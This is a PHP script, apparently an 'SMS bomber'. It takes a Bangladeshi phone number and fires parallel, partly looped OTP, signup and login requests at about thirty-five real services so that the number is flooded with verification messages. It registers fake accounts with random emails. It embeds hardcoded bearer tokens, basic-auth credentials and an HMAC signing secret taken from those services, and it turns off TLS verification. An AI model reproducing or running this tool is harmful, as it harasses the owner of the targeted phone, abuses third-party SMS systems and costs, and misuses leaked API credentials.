<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0); 
set_time_limit(0); 

// ==========================================
// 🛠️ Random String & Email Generators
// ==========================================
function generateRandomString($length = 8) {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
function generateRandomEmail() {
    $domains = ['gmail.com', 'yahoo.com', 'hotmail.com'];
    return generateRandomString(rand(5, 10)) . '@' . $domains[array_rand($domains)];
}

$phone = $_GET['phone'] ?? '';

if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
}

// ফোন ফরমেটিং
$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;

$phone_88 = "88" . $phone_11;             
$phone_plus88 = "+88" . $phone_11;        
$deepto_number = "+880" . substr($phone_11, -10); 
$phone_osudpotro = "+88-" . $phone_11;    
$phone_fundesh = substr($phone_11, 1);    

$api_requests = [];

// ==========================================
// 🆕 ১১টি নতুন এপিআই (আপনার দেওয়া হুবহু হেডার ও ডাটা)
// ==========================================

// 1. Shomvob
$api_requests[] = [
    "name" => "shomvob", "url" => "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", "method" => "POST",
    "data" => ["phone" => $phone_11],
    "headers" => ["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", "Content-Type: application/json", "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"]
];

// 2. Circle
$api_requests[] = [
    "name" => "circle", "url" => "https://reseller.circle.com.bd/api/v2/auth/signup", "method" => "POST",
    "data" => ["name" => $phone_plus88, "email_or_phone" => $phone_plus88, "password" => "123456", "password_confirmation" => "123456", "register_by" => "phone"],
    "headers" => ["User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)", "Content-Type: application/json"]
];

// 3. Qcoom
$api_requests[] = [
    "name" => "qcoom", "url" => "https://auth.qcoom.com/api/v1/otp/send", "method" => "POST",
    "data" => ["mobileNumber" => $phone_plus88],
    "headers" => ["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", "Referer: https://qcoom.com/", "Content-Type: application/json"]
];

// 4. Chinaonline (GET Method)
$api_requests[] = [
    "name" => "chinaonline", "url" => "https://chinaonlineapi.com/api/v1/get/otp?phone=".$phone_11, "method" => "GET",
    "headers" => ["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", "Accept: application/json, text/plain, */*", "token: gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219", "Origin: https://chinaonlinebd.com", "Referer: https://chinaonlinebd.com/"]
];

// 5. VNKSrvc
$api_requests[] = [
    "name" => "vnksrvc", "url" => "https://ucapi.vnksrvc.com/users/send_user_otp.json", "method" => "POST",
    "data" => ["direct_login" => true, "user" => ["login" => $phone_88, "resend" => false, "type" => ["register" => true]]],
    "headers" => ["Content-Type: application/json"]
];

// 6. Caretutors
$api_requests[] = [
    "name" => "caretutors", "url" => "https://api.caretutors.com/signup/guardian", "method" => "POST",
    "data" => ["name" => "Md Sajib", "email" => generateRandomEmail(), "phone" => $phone_11, "password" => "Sojib12345", "city_id" => "14", "location_id" => "905", "gender" => "Male", "fcm_token" => "fVCupBE5S6usL1eeOL3mi1:APA91bFWyNrIyHgklltdFkvfaJKYqA4rUeWCAGq99k2WpM_a91kLz_VRfamnLSvWeU_CLwofMRlNJ-Gmhg-fcxtZAUo1cwX5cdRuoTIisS8RRROdcDxmorNJXkc3F3mqo6xOrC14Yb1m"],
    "headers" => ["User-Agent: android AP1A.240405.002.A1 3.1.5", "Accept: application/json", "Authorization: Basic Y3RfYW5kcm9pZDokMnkkMTIkZWouREs1ckpJWmpGOUZva1RXRXJEZUR5bEE3Ti40YXB3MEZaMkZsbGNLNTNLRVlacURyeU8=", "Content-Type: application/json; charset=utf-8"]
];

// 7. Foodcollections
$api_requests[] = [
    "name" => "foodcollections", "url" => "https://foodcollections.com/api/v1/auth/sign-up", "method" => "POST",
    "data" => ["f_name" => generateRandomString(5), "l_name" => generateRandomString(5), "phone" => $phone_plus88, "email" => generateRandomEmail(), "password" => "Sojib12345", "ref_code" => ""],
    "headers" => ["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36", "Content-Type: application/json"]
];

// 8. Prothomalo
$api_requests[] = [
    "name" => "prothomalo", "url" => "https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo", "method" => "POST",
    "data" => ["phoneNumber" => $phone_plus88, "applicationChannel" => "WEB_APP"],
    "headers" => ["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", "Content-Type: application/json"]
];

// 9. Betonbook (৫ বার লুপ)
for($i=1; $i<=5; $i++){
    $api_requests[] = [
        "name" => "betonbook_$i", "url" => "https://api.betonbook.com/api/v5/auth/otp/request", "method" => "POST",
        "data" => ["phone" => $phone_11, "language" => 1],
        "headers" => ["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", "Content-Type: application/json"]
    ];
}

// 10. Moveon
$api_requests[] = [
    "name" => "moveon", "url" => "https://moveon.global/api/v1/customer/auth/phone/request-otp", "method" => "POST",
    "data" => ["phone" => $phone_11],
    "headers" => [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Type: application/json;charset=UTF-8", "accept: application/json, text/plain, */*", "origin: https://moveon.com.bd", 
        "referer: https://moveon.com.bd/", "sec-ch-ua: \"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A-Brand\";v=\"99\"",
        "sec-fetch-mode: cors", "sec-fetch-site: cross-site"
    ]
];

// 11. Portpos
$api_requests[] = [
    "name" => "portpos", "url" => "https://payment.portpos.com/v2/api/user/signup-otp", "method" => "POST",
    "data" => ["email_or_phone" => $phone_11],
    "headers" => ["User-Agent: Monibot", "Content-Type: application/json"]
];

// ==========================================
// 🟡 আগের এপিআইসমূহ (Untouched)
// ==========================================
$api_requests[] = ["name"=>"ali2bd","url"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login","method"=>"POST","data"=>["username"=>$phone_plus88],"headers"=>['Content-Type:application/json','User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0','Origin:https://ali2bd.com']];
$swap_timestamp = (string) time(); $swap_signature = base64_encode(hash_hmac('sha256', $deepto_number . $swap_timestamp, "UFNyP1f+s2bjwVAFbOBv87a142orsWLt7X/4M7pMVyE=", true));
$api_requests[] = ["name"=>"swap","url"=>"https://api.swap.com.bd/api/v1/send-otp/v2","method"=>"POST","data"=>["phone"=>$deepto_number,"timestamp"=>(int)$swap_timestamp],"headers"=>['Content-Type:application/json','signature:'.$swap_signature]];
$api_requests[] = ["name"=>"hishabee","url"=>"https://app.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88","method"=>"POST","headers"=>['content-length:0','Origin:https://web.hishabee.business']];
$api_requests[] = ["name"=>"osudpotro","url"=>"https://api.osudpotro.com/api/v1/users/send_otp","method"=>"POST","data"=>["mobile"=>$phone_osudpotro,"deviceToken"=>"web","language"=>"en","os"=>"web"],"headers"=>['Content-Type:application/json']];
$api_requests[] = ["name"=>"apex4u","url"=>"https://api.apex4u.com/api/auth/login","method"=>"POST","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json']];
$api_requests[] = ["name"=>"fundesh","url"=>"https://fundesh.com.bd/api/auth/generateOTP?service_key=","method"=>"POST","data"=>["msisdn"=>$phone_fundesh],"headers"=>['Content-Type:application/json']];
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"pbs_$i","url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP","method"=>"POST","data"=>["userPhone"=>$phone_11],"headers"=>['Content-Type:application/json','Origin:https://pbs.com.bd']];
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"shadhin_$i","url"=>"https://connect.shadhinmusic.com/v1/api//otp/send","method"=>"POST","data"=>["msisdn"=>$phone_88],"headers"=>['Content-Type:application/json','Origin:https://shadhinmusic.com']];
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"redx_$i","url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","method"=>"POST","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json','Origin:https://redx.com.bd']];
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"bikroy_$i","url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11","method"=>"GET"];
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"bdtickets_$i","url"=>"https://api.bdtickets.com:20100/v1/auth","method"=>"POST","data"=>["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],"headers"=>['Content-Type:application/json']];

// ==========================================
// ⚡ Strict Multi-cURL Engine (No Header Override)
// ==========================================
$mh = curl_multi_init();
$handles = [];

foreach($api_requests as $key => $api){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // ফিক্স
    
    // হেডারে আমি হাত দিচ্ছি না, এপিআই যেভাবে চেয়েছে সেভাবেই যাবে
    if(!empty($api['headers'])){
        curl_setopt($ch, CURLOPT_HTTPHEADER, $api['headers']);
    }

    if(isset($api['method']) && $api['method'] === "GET"){
        curl_setopt($ch, CURLOPT_POST, false);
        curl_setopt($ch, CURLOPT_HTTPGET, true); // GET Method Fix
    } else {
        curl_setopt($ch, CURLOPT_POST, true);
        $postData = (isset($api['data'])) ? json_encode($api['data']) : "";
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    }

    $handles[$key] = $ch;
    curl_multi_add_handle($mh, $ch);
}

$running = null;
do {
    curl_multi_exec($mh, $running);
    curl_multi_select($mh);
} while ($running > 0);

$final_results = [];
foreach($handles as $key => $ch){
    $final_results[$api_requests[$key]['name']] = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}
curl_multi_close($mh);

echo json_encode(["status" => "success", "total_hits" => count($api_requests), "results" => $final_results], JSON_PRETTY_PRINT);
?>
